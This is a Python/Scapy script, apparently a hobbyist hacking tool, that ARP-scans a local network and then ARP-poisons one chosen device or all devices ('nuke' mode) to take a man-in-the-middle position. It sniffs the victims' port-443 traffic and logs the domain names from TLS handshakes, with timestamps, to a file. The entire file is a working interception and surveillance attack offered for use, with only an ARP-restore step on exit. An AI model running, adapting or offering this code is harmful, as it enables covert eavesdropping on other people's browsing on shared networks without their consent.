from scapy.all import *
import scapy.all as scapy
from scapy.all import ARP, Ether, srp
import cryptography
from datetime import datetime
from multiprocessing import Process


load_layer("tls")
load_layer("http")
load_layer("dns")


my_Mac = Ether().src
my_IP = get_if_addr(conf.iface)
arp_scan_mode = 4
mac_look_up = True

def ARP_Scan():
    target_ip = "192.168.1.1/24"
    arp = ARP(pdst=target_ip)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether/arp

    print("\n[+] Starting ARP Scan... (Speed mode: " + str(arp_scan_mode)+ ")")

    if arp_scan_mode == 1:
        result = srp(packet, timeout=10, retry=-3, verbose=0)[0]
    elif arp_scan_mode == 2:
        result = srp(packet, timeout=8, retry=-3, verbose=0)[0]
    elif arp_scan_mode == 3:
        result = srp(packet, timeout=6, retry=-2, verbose=0)[0]
    elif arp_scan_mode == 4:
        result = srp(packet, timeout=4, retry=-2, verbose=0)[0]
    elif arp_scan_mode == 5:
        result = srp(packet, timeout=2, retry=-2, verbose=0)[0]

    targets = []
    for sent, received in result:
        targets.append({'ip': received.psrc, 'mac': received.hwsrc})
    return targets

def targets_table(targets):
    p_targets = []
    i = 0
    for target in targets:
        if target["ip"] != my_IP and target["ip"] != router_ip:
            target_ip = target["ip"]
            target_mac = target["mac"]
            i = i + 1
            p_targets.append({'ip': target_ip, 'mac': target_mac})
            
            if mac_look_up:
                mac_info = mac_lookup(target_mac)
                print("| Target #"+ str(i) +" | IP: " + str(target_ip) + " | MAC: " + str(target_mac) + " | INFO: {:<12} |".format(mac_info))
                print("==============================================================================")
            else:
                print("| Target #"+ str(i) +" | IP: " + str(target_ip) + " | MAC: " + str(target_mac) + " |")
                print("=========================================================")
    return p_targets

def spoof(target_ip, target_mac, router_ip, router_mac):
    # Spoofing Router
    packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = target_mac, psrc = router_ip)
    scapy.send(packet, verbose = False)
    # Spoofing Target
    packet = scapy.ARP(op = 2, pdst = router_ip, hwdst = router_mac, psrc = target_ip)
    scapy.send(packet, verbose = False)

def restore(target_ip, target_mac, router_ip, router_mac):
    # Restauring Targets Tables
    packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = target_mac, psrc = router_ip, hwsrc = router_mac)
    scapy.send(packet, verbose = False)
    # Restauring Router Table
    packet = scapy.ARP(op = 2, pdst = router_ip, hwdst = router_mac, psrc = target_ip, hwsrc = target_mac)
    scapy.send(packet, verbose = False)

def mac_lookup(mac_address):
    with open("mac_list.txt", 'r', encoding="utf8") as f:
        for line in f:
            if mac_address[:8].upper() in line:
                s_line = line
                mac_info = s_line.split()[1]
                return mac_info
        return "None"

#Processing Packets
def process_packet(packet):
    if "TLS Handshake - Client Hello" in str(packet):
        dt = datetime.now()
        pkt_infos = packet.show(dump=True)
        for line in pkt_infos.splitlines():
            if "servernames=" in line:
                domain = str(line.strip("[]''=")[35:len(line)])
                if domain:
                    ip_routing = str(packet).split("/")
                    with open("sni_output.txt", "a") as f:
                        print(str(dt) + " | " + ip_routing[3][5:] + "| " + domain, file=f)
                else:
                    pass
            
def sniping_sniffing(p_targets, target_num):
    i = 0
    for target in p_targets:
            i = i + 1
            if int(target_num) == i:
                target_ip = target["ip"]
    dt = datetime.now()
    print("\n[SNIFF] - [" + str(dt) + "] - [" + str(target_ip) + "] | Starting Packet Capture !\n")
    sniff(filter="host "+ target_ip + " and tcp port 443", prn=process_packet)

def nuke_sniffing(targets):
    try:
        for target in targets:
            try:
                target_ip = target["ip"]
                process = Process(target=multi_sniff,  args=(target_ip,))
                process.start()
            except:
                process.terminate()
                break
    except:
        print("pass")
        pass
    
def multi_sniff(target_ip):
    dt = datetime.now()
    print("[SNIFF] - [" + str(dt) + "] - [" + str(target_ip) + "] | Starting Packet Capture !")
    sniff(filter="host "+ target_ip + " and tcp port 443", prn=process_packet)

def sniping_loop(p_targets, target_num, router_ip, router_mac):
    while True:
        try:
            attempts = 0
            i = 0
            for target in p_targets:
                i = i + 1
                if int(target_num) == i:
                    target_ip = target["ip"]
                    target_mac = target["mac"]
                    try:
                        spoof(target_ip, target_mac, router_ip, router_mac)
                        dt = datetime.now()
                        print("[POISON] - [" + str(dt) + "] - [" + str(target_ip) + "] | Target #" + str(i) + " Poisoned Successfully !")
                        time.sleep(2)
                    except KeyboardInterrupt:
                        break
                    except:
                        if attempts <= 3:
                            print("\n[POISON] - Can't reach " + str(target_ip) + " ! | Attempt " + str(attempts) + "...")
                            attempts = attempts + 1
                        else:
                            print("\n[POISON] - Can't reach " + str(target_ip) + " after 3 attempts ! | Exiting...") 
                            break
        except:
            break
            
def nuke_loop(p_targets, router_ip, router_mac):
            while True:
                i = 0
                time.sleep(2)
                print()
                for target in p_targets:
                    try:
                        spoof(target["ip"], target["mac"], router_ip, router_mac)
                        i = i + 1
                        dt = datetime.now()
                        print("[POISON] - [" + str(dt) + "] - [" + str(target["ip"]) + "] | Target #" + str(i) + " Poisoned Successfully !")
                    except KeyboardInterrupt:
                        break
                    except:
                        print("\n[POISON] - Can't reach " + str(target["ip"]) + "... Skipping to the next Target !")
                        pass


    
#########################################################################################


if __name__ == '__main__':

    # Clear Terminal
    os.system('cls' if os.name == 'nt' else 'clear')
    print("""                                                                                                                                          
                 ..                                ..     
               ':;.                                .;;'   
              ,;.                                    .:,  
             .c.                                      .c. 
             cl                                       .oc 
            .xk.          01010110 01000101           .Ox.
            'OX:      01001110 01010101 01001101      cXO'
            ;KNO,                                    ,OW0,
            ;KNNk.                                  'ONNK;
            ;XWNNd.                                .dXXNK;
            ;XWNWNd.                              .dXNNWX;
            ,0NWNNXd,.                          .,dXWWNN0,
            .xNNNNNX0c.                         c0XNXXNNk.
             :KNNNNXKd.                        .d0KXNNNKc 
             .oKXXXXK0x:,'.                 ';:xKKXNXXKo. 
              .l0XNNNKK0Okl.              .lkO0KKXNNN0l.  
                'lOKXKXXK0Oo;.          .;oO00KXXXX0o'    
                  'd0KKKK0OOxo;.      .,okOO0KXKK0d,      
                   .,ccldxxxo:'        .:oxxxxolc,.       
                         ...              ...
                                                                       
                                            •°¯`•• v.1.0 by.Haash ••`¯°•  """)

    # Wait for User to press "Enter" to launch ARP Scan
    input("\n[+] Press Enter to Start... ")

    # ARP scanning the network
    targets = ARP_Scan()

    # checking for Router IP/MAC
    for target in targets:
        if target["ip"] == "192.168.1.1" or target["ip"] == "10.0.0.1":
            router_mac = target["mac"]
            router_ip = target["ip"]

    # Checking all available targets
    print("\n[+] " + str(len(targets) - 2) + " Targets Found: ")
    if mac_look_up:
        print("==============================================================================")
    else:
        print("\n=========================================================")

    # Showing targets table to let user chose attack mode and target
    p_targets = targets_table(targets)

    # Possibility for the user to Scan again for better results.
    while True:
        relaunch = input("\n[+] Do you want to relaunch an ARP Scan ? (Y/N): ")
        while relaunch.lower() not in {'y', 'n', 'yes', 'no'}:
            relaunch = input("\n[-] Please input a valid answer ! (Y/N): ")
        if relaunch.lower() == "yes" or relaunch.lower() == "y":
            targets = ARP_Scan()
            print("\n[+] " + str(len(targets) - 2) + " Targets Found: ")
            if mac_look_up:
                print("==============================================================================")
            else:
                print("\n=========================================================")
            p_targets = targets_table(targets)
        elif relaunch.lower() == "no" or relaunch.lower() == "n":
            break
    
    #Defining the Attack Mode | Choosing between Sniping and Nuke
    attack_mode = input("\n[+] Do you want to target a specific device ? If you choose NO, the script will target all devices at the same time ! (Y/N): ")
    while attack_mode.lower() not in {'y', 'n', 'yes', 'no'}:
        attack_mode = input("\n[-] Please input a valid answer ! (Y/N): ")

    # Set Sniping mode
    if attack_mode.lower() == "y" or attack_mode.lower() == "yes":
        attack_mode = "sniping"

        target_num = input("\n[+] Which device would you like to target ? (1/2/3/4/...): ")
        while target_num == "0" or int(target_num) > len(p_targets):
            target_num = input("\n[+] Please select a valid target ! (1/2/3/4/...): ")
        i = 0
        for target in p_targets:
            i = i + 1
            if i == int(target_num):
                target_ip = target["ip"]
                target_mac = target["mac"]
                print("\n[+] Starting poisoning Target n°" + str(target_num) + " [" + str(target_ip) +"]...")
                print("\n============================================================================\n")
                break
    # Set Nuke Mode
    else:
        attack_mode = "nuke"
        print("\n[+] Nuke mode enabled ! Poisoning all devices... ")
        print("\n============================================================================\n")
    
    # Launching Nuke attack
    try:
        if attack_mode == "nuke":
            try:
                p1 = Process(target=nuke_loop, args=(p_targets, router_ip, router_mac))
                p2 = Process(target=nuke_sniffing, args=(p_targets,))
                p1.start()
                time.sleep(3)
                p2.start()
                p1.join()
                p2.join()
            except:
                p1.terminate()
                p2.terminate()
                pass

    # Launching Sniping attack
        elif attack_mode == "sniping":
            try:
                p1 = Process(target=sniping_loop, args=(p_targets, target_num, router_ip, router_mac))
                p2 = Process(target=sniping_sniffing, args=(p_targets, target_num))
                p1.start()
                time.sleep(3)
                p2.start()
                p1.join()
                p2.join()
            except:
                p1.terminate()
                p2.terminate()
                pass
    except:
        pass

    print("\n===============================")
    print("=== [-] Spoofing Canceled ! ===")
    print("===============================")
    try:
        if attack_mode == "sniping":
            i = 0
            for target in p_targets:
                i = i + 1
                if int(target_num) == i:
                    target_ip = target["ip"]
                    target_mac = target["mac"]
                    try:
                        restore(target_ip, target_mac, router_ip, router_mac)
                        dt = datetime.now()
                        print("\n[RESTORE] - [" + str(dt) + "] - [" + str(target_ip) + "] | Target #" + str(i) + " Table Restored Successfully !")
                        print("\n[RESTORE] - [" + str(dt) + "] | Exiting... \n")
                        SystemExit()
                    except:
                        print("\n[-] " + str(dt) + " | Can't restore: " + target_ip + " | Exiting... ")
                        SystemExit()

        elif attack_mode == "nuke":
            # 
            for target in p_targets:
                try:
                    restore(target["ip"], target["mac"], router_ip, router_mac)
                    dt = datetime.now()
                    print("\n[RESTORE] - [" + str(dt) + "] - [" + target["ip"] + "] | ARP table restored !")
                except:
                    dt = datetime.now()
                    print("\n[RESTORE] - [" + str(dt) + "] | Can't restore: " + target["ip"] + " | Skipping to the next Device... ")
                    pass
            dt = datetime.now()
            print("\n[INFO] - [" + str(dt) + "] | Exiting... ")
    except:
        print("\n[-] Restoring Tables Failed ! Exiting...")
        SystemExit()

